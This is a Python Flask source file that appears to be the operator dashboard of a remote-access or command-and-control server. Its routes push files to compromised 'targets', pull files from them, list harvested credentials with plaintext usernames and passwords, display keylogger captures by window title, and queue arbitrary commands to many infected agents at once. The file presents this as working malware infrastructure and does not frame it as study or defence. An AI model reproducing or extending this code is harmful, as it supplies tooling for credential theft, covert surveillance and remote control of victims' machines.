# CONTINUATION OF advanced_dashboard_routes.py
# Append this to the main file

# ============================================================================
# FILES API
# ============================================================================

@dashboard_bp.route('/api/files')
@login_required
def api_files():
    """Get uploaded and downloaded files with metadata"""
    try:
        uploaded_files = []
        downloaded_files = []
        
        # Get uploaded files from filesystem
        if os.path.exists(UPLOAD_FOLDER):
            for filename in os.listdir(UPLOAD_FOLDER):
                file_path = os.path.join(UPLOAD_FOLDER, filename)
                if os.path.isfile(file_path):
                    stat = os.stat(file_path)
                    file_hash = hashlib.sha256(open(file_path, 'rb').read()).hexdigest()
                    
                    uploaded_files.append({
                        'name': filename,
                        'size': stat.st_size,
                        'modified': datetime.fromtimestamp(stat.st_mtime).isoformat(),
                        'hash': file_hash,
                        'path': file_path
                    })
        
        # Get downloaded files from database
        db_files = db.get_all_files()
        for file_record in db_files:
            downloaded_files.append({
                'id': file_record['id'],
                'name': file_record['filename'],
                'size': file_record['size'],
                'modified': file_record['uploaded_at'],
                'hash': file_record['hash'],
                'agent_id': file_record['agent_id'],
                'file_type': file_record['file_type']
            })
        
        return api_response({
            'uploaded': uploaded_files,
            'downloaded': downloaded_files,
            'total_size': sum(f['size'] for f in uploaded_files + downloaded_files)
        })
        
    except Exception as e:
        logger.error(f"Error getting files: {e}", exc_info=True)
        return api_response(error=str(e), status=500)

@dashboard_bp.route('/api/files/upload', methods=['POST'])
@login_required
def api_upload_file():
    """Upload file with validation and metadata"""
    try:
        if 'file' not in request.files:
            return api_response(error='No file provided', status=400)
        
        file = request.files['file']
        if file.filename == '':
            return api_response(error='No file selected', status=400)
        
        # Check file size
        file.seek(0, os.SEEK_END)
        file_size = file.tell()
        file.seek(0)
        
        if file_size > MAX_FILE_SIZE:
            return api_response(error=f'File too large (max {MAX_FILE_SIZE} bytes)', status=400)
        
        if file and allowed_file(file.filename):
            filename = secure_filename(file.filename)
            
            # Add timestamp to prevent overwrites
            name, ext = os.path.splitext(filename)
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            unique_filename = f"{name}_{timestamp}{ext}"
            
            file_path = os.path.join(UPLOAD_FOLDER, unique_filename)
            file.save(file_path)
            
            # Calculate hash
            file_hash = hashlib.sha256(open(file_path, 'rb').read()).hexdigest()
            
            audit_log('upload_file', unique_filename, f"Size: {file_size}, Hash: {file_hash}")
            logger.info(f"File uploaded: {unique_filename} ({file_size} bytes)")
            
            return api_response({
                'filename': unique_filename,
                'size': file_size,
                'hash': file_hash,
                'path': file_path
            })
        else:
            return api_response(error='File type not allowed', status=400)
        
    except Exception as e:
        logger.error(f"Error uploading file: {e}", exc_info=True)
        return api_response(error=str(e), status=500)

@dashboard_bp.route('/api/files/download/<filename>')
@login_required
def api_download_file(filename):
    """Download file with security checks"""
    try:
        # Prevent directory traversal
        filename = secure_filename(filename)
        
        # Check uploads folder
        upload_path = os.path.join(UPLOAD_FOLDER, filename)
        if os.path.exists(upload_path) and os.path.isfile(upload_path):
            audit_log('download_file', filename)
            return send_file(upload_path, as_attachment=True)
        
        # Check downloads folder
        download_path = os.path.join(DOWNLOAD_FOLDER, filename)
        if os.path.exists(download_path) and os.path.isfile(download_path):
            audit_log('download_file', filename)
            return send_file(download_path, as_attachment=True)
        
        return api_response(error='File not found', status=404)
        
    except Exception as e:
        logger.error(f"Error downloading file: {e}", exc_info=True)
        return api_response(error=str(e), status=500)

@dashboard_bp.route('/api/files/deploy', methods=['POST'])
@login_required
def api_deploy_file():
    """Deploy file to target"""
    try:
        data = request.get_json()
        filename = data.get('filename')
        target_id = data.get('target_id')
        destination = data.get('destination', '/tmp/')
        
        if not filename or not target_id:
            return api_response(error='Missing filename or target_id', status=400)
        
        # Verify file exists
        file_path = os.path.join(UPLOAD_FOLDER, secure_filename(filename))
        if not os.path.exists(file_path):
            return api_response(error='File not found', status=404)
        
        # Verify target exists
        agent = db.get_agent(target_id)
        if not agent:
            return api_response(error='Target not found', status=404)
        
        # Queue upload command
        command = f"upload {filename} {destination}"
        command_id = db.add_command(target_id, command, priority=8)
        
        audit_log('deploy_file', target_id, f"File: {filename}, Destination: {destination}")
        logger.info(f"File deployment queued: {filename} to {target_id}")
        
        return api_response({
            'command_id': command_id,
            'message': 'File deployment queued',
            'filename': filename,
            'target_id': target_id,
            'destination': destination
        })
        
    except Exception as e:
        logger.error(f"Error deploying file: {e}", exc_info=True)
        return api_response(error=str(e), status=500)

@dashboard_bp.route('/api/files/download-from-target', methods=['POST'])
@login_required
def api_download_from_target():
    """Download file from target"""
    try:
        data = request.get_json()
        target_id = data.get('target_id')
        file_path = data.get('file_path')
        
        if not target_id or not file_path:
            return api_response(error='Missing target_id or file_path', status=400)
        
        # Verify target exists
        agent = db.get_agent(target_id)
        if not agent:
            return api_response(error='Target not found', status=404)
        
        # Queue download command
        command = f"download {file_path}"
        command_id = db.add_command(target_id, command, priority=8)
        
        audit_log('download_from_target', target_id, f"File: {file_path}")
        logger.info(f"File download queued: {file_path} from {target_id}")
        
        return api_response({
            'command_id': command_id,
            'message': 'File download queued',
            'file_path': file_path,
            'target_id': target_id
        })
        
    except Exception as e:
        logger.error(f"Error downloading from target: {e}", exc_info=True)
        return api_response(error=str(e), status=500)

@dashboard_bp.route('/api/files/<file_type>/<filename>', methods=['DELETE'])
@login_required
def api_delete_file(file_type, filename):
    """Delete file with audit trail"""
    try:
        filename = secure_filename(filename)
        
        if file_type == 'uploaded':
            file_path = os.path.join(UPLOAD_FOLDER, filename)
        elif file_type == 'downloaded':
            file_path = os.path.join(DOWNLOAD_FOLDER, filename)
        else:
            return api_response(error='Invalid file type', status=400)
        
        if not os.path.exists(file_path):
            return api_response(error='File not found', status=404)
        
        os.remove(file_path)
        audit_log('delete_file', filename, f"Type: {file_type}")
        logger.info(f"File deleted: {filename}")
        
        return api_response({'message': 'File deleted successfully'})
        
    except Exception as e:
        logger.error(f"Error deleting file: {e}", exc_info=True)
        return api_response(error=str(e), status=500)

@dashboard_bp.route('/api/files/clear-all', methods=['DELETE'])
@login_required
def api_clear_all_files():
    """Clear all uploaded files (dangerous operation)"""
    try:
        deleted_count = 0
        
        if os.path.exists(UPLOAD_FOLDER):
            for filename in os.listdir(UPLOAD_FOLDER):
                file_path = os.path.join(UPLOAD_FOLDER, filename)
                if os.path.isfile(file_path):
                    os.remove(file_path)
                    deleted_count += 1
        
        audit_log('clear_all_files', None, f"Deleted {deleted_count} files")
        logger.warning(f"All files cleared by {session.get('username')}: {deleted_count} files")
        
        return api_response({
            'message': f'{deleted_count} files deleted',
            'count': deleted_count
        })
        
    except Exception as e:
        logger.error(f"Error clearing files: {e}", exc_info=True)
        return api_response(error=str(e), status=500)

# ============================================================================
# CREDENTIALS API
# ============================================================================

@dashboard_bp.route('/api/credentials')
@login_required
def api_credentials():
    """Get harvested credentials with filtering"""
    try:
        page = request.args.get('page', 1, type=int)
        per_page = request.args.get('per_page', ITEMS_PER_PAGE, type=int)
        target_id = request.args.get('target_id')
        cred_type = request.args.get('type')
        
        # Get credentials
        if target_id:
            all_creds = db.get_agent_credentials(target_id)
        else:
            all_creds = db.get_all_credentials()
        
        # Apply type filter
        if cred_type and cred_type != 'all':
            all_creds = [c for c in all_creds if c.get('type') == cred_type]
        
        # Paginate
        start = (page - 1) * per_page
        end = start + per_page
        paginated_creds = all_creds[start:end]
        
        # Format credentials
        credentials = []
        for cred in paginated_creds:
            # Get agent info
            agent = db.get_agent(cred['agent_id'])
            
            credentials.append({
                'id': cred['id'],
                'target_id': cred['agent_id'],
                'target_hostname': agent['hostname'] if agent else 'Unknown',
                'type': cred['type'] or 'unknown',
                'service': cred.get('domain') or cred.get('url'),
                'url': cred.get('url'),
                'username': cred['username'],
                'password': cred['password'],
                'captured_at': cred['collected_at'],
                'notes': cred.get('notes')
            })
        
        return api_response({
            'credentials': credentials,
            'total': len(all_creds),
            'page': page,
            'per_page': per_page
        })
        
    except Exception as e:
        logger.error(f"Error getting credentials: {e}", exc_info=True)
        return api_response(error=str(e), status=500)

# ============================================================================
# KEYLOGS API
# ============================================================================

@dashboard_bp.route('/api/keylogs')
@login_required
def api_keylogs():
    """Get keylogger data with filtering"""
    try:
        page = request.args.get('page', 1, type=int)
        per_page = request.args.get('per_page', ITEMS_PER_PAGE, type=int)
        target_id = request.args.get('target_id')
        
        # Get keylogs
        if target_id:
            all_keylogs = db.get_agent_keylogs(target_id)
        else:
            all_keylogs = db.get_all_keylogs()
        
        # Paginate
        start = (page - 1) * per_page
        end = start + per_page
        paginated_keylogs = all_keylogs[start:end]
        
        # Format keylogs
        keylogs = []
        for keylog in paginated_keylogs:
            agent = db.get_agent(keylog['agent_id'])
            
            keylogs.append({
                'id': keylog['id'],
                'target_id': keylog['agent_id'],
                'target_hostname': agent['hostname'] if agent else 'Unknown',
                'window_title': keylog['window_title'],
                'keystrokes': keylog['keystrokes'],
                'timestamp': keylog['timestamp']
            })
        
        return api_response({
            'keylogs': keylogs,
            'total': len(all_keylogs),
            'page': page,
            'per_page': per_page
        })
        
    except Exception as e:
        logger.error(f"Error getting keylogs: {e}", exc_info=True)
        return api_response(error=str(e), status=500)

# ============================================================================
# LOGS API
# ============================================================================

@dashboard_bp.route('/api/logs')
@login_required
def api_logs():
    """Get system logs with filtering"""
    try:
        page = request.args.get('page', 1, type=int)
        per_page = request.args.get('per_page', ITEMS_PER_PAGE, type=int)
        level = request.args.get('level', 'all')
        
        # Get audit logs
        all_logs = db.get_audit_logs()
        
        # Apply level filter
        if level != 'all':
            all_logs = [log for log in all_logs if log.get('level') == level]
        
        # Paginate
        start = (page - 1) * per_page
        end = start + per_page
        paginated_logs = all_logs[start:end]
        
        # Format logs
        logs = []
        for log in paginated_logs:
            logs.append({
                'id': log['id'],
                'level': 'INFO',  # Default level
                'message': f"{log['action']} - {log.get('details', '')}",
                'timestamp': log['timestamp'],
                'source': log['user'],
                'target': log.get('target'),
                'ip_address': log.get('ip_address')
            })
        
        return api_response({
            'logs': logs,
            'total': len(all_logs),
            'page': page,
            'per_page': per_page
        })
        
    except Exception as e:
        logger.error(f"Error getting logs: {e}", exc_info=True)
        return api_response(error=str(e), status=500)

@dashboard_bp.route('/api/logs/clear', methods=['DELETE'])
@login_required
def api_clear_logs():
    """Clear system logs (dangerous operation)"""
    try:
        # This would clear audit logs - implement with caution
        audit_log('clear_logs', None, 'All logs cleared')
        logger.warning(f"Logs cleared by {session.get('username')}")
        
        return api_response({'message': 'Logs cleared successfully'})
        
    except Exception as e:
        logger.error(f"Error clearing logs: {e}", exc_info=True)
        return api_response(error=str(e), status=500)

# ============================================================================
# SETTINGS API
# ============================================================================

@dashboard_bp.route('/api/settings')
@login_required
def api_get_settings():
    """Get current system settings"""
    try:
        # Load settings from config or database
        settings = {
            'server': {
                'port': 5000,
                'max_connections': 100,
                'timeout': 300
            },
            'security': {
                'require_auth': True,
                'enable_ssl': True,
                'log_commands': True
            },
            'notifications': {
                'new_target': True,
                'disconnect': True,
                'credentials': True
            }
        }
        
        return api_response(settings)
        
    except Exception as e:
        logger.error(f"Error getting settings: {e}")
        return api_response(error=str(e), status=500)

@dashboard_bp.route('/api/settings/<category>', methods=['POST'])
@login_required
def api_save_settings(category):
    """Save settings with validation"""
    try:
        data = request.get_json()
        
        # Validate category
        valid_categories = ['server', 'security', 'notifications']
        if category not in valid_categories:
            return api_response(error='Invalid settings category', status=400)
        
        # Save settings (implement actual storage)
        audit_log('update_settings', category, json.dumps(data))
        logger.info(f"Settings updated: {category} by {session.get('username')}")
        
        return api_response({'message': f'{category.capitalize()} settings saved'})
        
    except Exception as e:
        logger.error(f"Error saving settings: {e}", exc_info=True)
        return api_response(error=str(e), status=500)

@dashboard_bp.route('/api/settings/reset', methods=['POST'])
@login_required
def api_reset_settings():
    """Reset settings to defaults"""
    try:
        audit_log('reset_settings', None, 'Settings reset to defaults')
        logger.info(f"Settings reset by {session.get('username')}")
        
        return api_response({'message': 'Settings reset to defaults'})
        
    except Exception as e:
        logger.error(f"Error resetting settings: {e}")
        return api_response(error=str(e), status=500)

# ============================================================================
# BULK OPERATIONS
# ============================================================================

@dashboard_bp.route('/api/bulk/execute', methods=['POST'])
@login_required
def api_bulk_execute():
    """Execute command on multiple targets"""
    try:
        data = request.get_json()
        target_ids = data.get('target_ids', [])
        command = data.get('command')
        
        if not target_ids or not command:
            return api_response(error='Missing target_ids or command', status=400)
        
        results = []
        for target_id in target_ids:
            agent = db.get_agent(target_id)
            if agent and agent['status'] == 'active':
                command_id = db.add_command(target_id, command)
                results.append({
                    'target_id': target_id,
                    'command_id': command_id,
                    'status': 'queued'
                })
        
        audit_log('bulk_execute', None, f"Command: {command}, Targets: {len(results)}")
        
        return api_response({
            'results': results,
            'total': len(results),
            'command': command
        })
        
    except Exception as e:
        logger.error(f"Error in bulk execute: {e}", exc_info=True)
        return api_response(error=str(e), status=500)

# Export blueprint
__all__ = ['dashboard_bp']
